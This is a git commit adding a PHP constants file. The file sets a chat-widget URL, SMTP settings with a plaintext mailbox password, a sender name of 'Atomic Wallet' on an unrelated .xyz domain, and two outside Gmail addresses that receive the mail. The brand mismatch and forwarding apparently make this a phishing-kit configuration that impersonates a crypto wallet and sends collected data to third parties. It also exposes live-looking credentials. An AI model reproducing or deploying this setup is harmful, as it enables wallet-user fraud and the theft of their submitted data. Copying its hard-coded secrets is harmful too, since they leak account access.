bc1151156807bfcc4cee6d0f2e9c4a5946f6b717
vinay sachan <vinay@tappetbox.com>
2026-04-13 01:59:40 +0530

    d

---
+++ includes/constant.php
@@ -0,0 +1,13 @@
+<?php
+define('TAWK_URL', 'https://embed.tawk.to/69c750844673571c37768c65/1jkp952eu');
+define('CONST_MAIL_SERVER', 'smtpout.secureserver.net');
+define('CONST_MAIL_USERNAME', 'help@tavelssky.xyz');
+define('CONST_MAIL_PASSWORD', 'Help@me123');
+define('CONST_MAIL_FROM', 'help@tavelssky.xyz');
+define('CONST_MAIL_PORT', '465');
+define('CONST_MAIL_FROM_NAME', 'Atomic Wallet');
+define('CONST_RECEIVE_EMAIL', 'wood.peter761@gmail.com');
+define('CONST_RECEIVE_EMAIL_CC', ['leon786smith@gmail.com']);
+//define('CONST_RECEIVE_EMAIL', 'vinaysachan@live.in');
+
+?>
